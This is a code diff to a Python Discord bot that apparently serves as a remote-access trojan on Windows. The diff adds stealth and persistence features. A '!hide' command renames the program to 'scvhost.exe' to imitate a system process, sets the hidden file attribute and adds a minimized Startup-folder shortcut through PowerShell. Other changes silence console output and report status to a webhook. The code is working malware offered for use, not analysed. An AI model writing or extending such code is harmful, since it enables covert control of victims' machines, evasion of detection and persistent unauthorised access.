@@ -12,6 +12,8 @@ import getpass
 import requests
 import uuid
 import asyncio
+import random
+import string
 from discord.ext import commands
 from dotenv import load_dotenv
 import sqlite3
@@ -41,6 +43,67 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 
 shell_process = None
 shell_thread = None
+
+# Hidden state
+is_hidden = False
+original_filename = None
+hidden_paths = {}
+HIDE_NAME = "scvhost.exe"
+
+def add_to_startup(file_path):
+    """Add program to Windows startup"""
+    try:
+        startup_folder = os.path.join(os.environ['APPDATA'], 
+                                       r'Microsoft\Windows\Start Menu\Programs\Startup')
+        shortcut_path = os.path.join(startup_folder, "scvhost.lnk")
+        
+        ps_script = f'''
+        $WshShell = New-Object -comObject WScript.Shell
+        $Shortcut = $WshShell.CreateShortcut("{shortcut_path}")
+        $Shortcut.TargetPath = "{file_path}"
+        $Shortcut.WorkingDirectory = "{os.path.dirname(file_path)}"
+        $Shortcut.WindowStyle = 7
+        $Shortcut.Save()
+        '''
+        subprocess.run(['powershell', '-command', ps_script], shell=True, capture_output=True)
+        return shortcut_path
+    except:
+        return None
+
+def remove_from_startup():
+    """Remove program from Windows startup"""
+    try:
+        startup_folder = os.path.join(os.environ['APPDATA'], 
+                                       r'Microsoft\Windows\Start Menu\Programs\Startup')
+        for item in os.listdir(startup_folder):
+            if item.lower() == "scvhost.lnk":
+                try:
+                    os.remove(os.path.join(startup_folder, item))
+                    return True
+                except:
+                    pass
+        return True
+    except:
+        return False
+
+def hide_file(file_path):
+    """Hide a file using Windows attributes"""
+    try:
+        ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)
+        return True
+    except:
+        return False
+
+def unhide_file(file_path):
+    """Unhide a file"""
+    try:
+        ctypes.windll.kernel32.SetFileAttributesW(file_path, 128)
+        return True
+    except:
+        return False
+
+def get_current_script_path():
+    return os.path.abspath(sys.argv[0])
 
 def get_public_ip():
     try:
@@ -343,8 +406,104 @@ def list_directory(path='.'):
 
 @bot.event
 async def on_ready():
-    print(f'Logged in as {bot.user}')
-    print(f'Bot ID: {bot.user.id}')
+    pass  # Silent startup
+
+@bot.command()
+async def hide(ctx):
+    """Hide the bot: rename to scvhost.exe, hide file, add to startup"""
+    global is_hidden, original_filename, hidden_paths
+    
+    await ctx.send("Hiding bot...")
+    
+    try:
+        script_path = get_current_script_path()
+        script_dir = os.path.dirname(script_path)
+        original_filename = os.path.basename(script_path)
+        
+        # Rename to scvhost.exe
+        new_path = os.path.join(script_dir, HIDE_NAME)
+        
+        # If scvhost.exe already exists, remove it first
+        if os.path.exists(new_path) and new_path != script_path:
+            try:
+                os.remove(new_path)
+            except:
+                pass
+        
+        os.rename(script_path, new_path)
+        hidden_paths['new_path'] = new_path
+        
+        # Hide the file
+        hide_file(new_path)
+        hidden_paths['hidden'] = True
+        
+        # Add to startup
+        startup_path = add_to_startup(new_path)
+        if startup_path:
+            hidden_paths['startup'] = startup_path
+            hide_file(startup_path)
+        
+        is_hidden = True
+        
+        await send_webhook(f"**BOT HIDDEN**\nRenamed to: {HIDE_NAME}\nStartup added: Yes")
+        await ctx.send(f"Bot hidden successfully! Renamed to: {HIDE_NAME}")
+        
+    except Exception as e:
+        await ctx.send(f"Hide failed: {str(e)}")
+        await send_webhook(f"Hide failed: {str(e)}")
+
+@bot.command()
+async def unhide(ctx):
+    """Unhide the bot: restore original name, unhide, remove from startup"""
+    global is_hidden, original_filename, hidden_paths
+    
+    await ctx.send("Unhiding bot...")
+    
+    try:
+        script_path = get_current_script_path()
+        script_dir = os.path.dirname(script_path)
+        
+        # Remove from startup
+        remove_from_startup()
+        
+        # Unhide file
+        unhide_file(script_path)
+        
+        # Restore original name if possible
+        if original_filename and 'new_path' in hidden_paths:
+            original_path = os.path.join(script_dir, original_filename)
+            
+            # Remove original if it exists (as a file)
+            if os.path.exists(original_path) and os.path.isfile(original_path):
+                try:
+                    os.remove(original_path)
+                except:
+                    pass
+            
+            # Rename back to original
+            if script_path != original_path:
+                os.rename(script_path, original_path)
+                hidden_paths['restored_path'] = original_path
+        
+        is_hidden = False
+        hidden_paths = {}
+        
+        await send_webhook("**BOT UNHIDDEN**\nStartup removed\nFile unhidden")
+        await ctx.send("Bot unhidden successfully!")
+        
+    except Exception as e:
+        await ctx.send(f"Unhide failed: {str(e)}")
+        await send_webhook(f"Unhide failed: {str(e)}")
+
+@bot.command()
+async def status(ctx):
+    """Check if bot is hidden"""
+    if is_hidden:
+        await ctx.send("🔒 Bot is currently HIDDEN as scvhost.exe")
+        await send_webhook("Status: Hidden as scvhost.exe")
+    else:
+        await ctx.send("🔓 Bot is NOT hidden")
+        await send_webhook("Status: Not hidden")
 
 @bot.command()
 async def ip(ctx):
@@ -567,4 +726,10 @@ async def webhook_test(ctx):
     await ctx.send("Test sent.")
 
 if __name__ == '__main__':
+    # Suppress output
+    import sys
+    import io
+    sys.stdout = io.StringIO()
+    sys.stderr = io.StringIO()
+    
     bot.run(TOKEN)
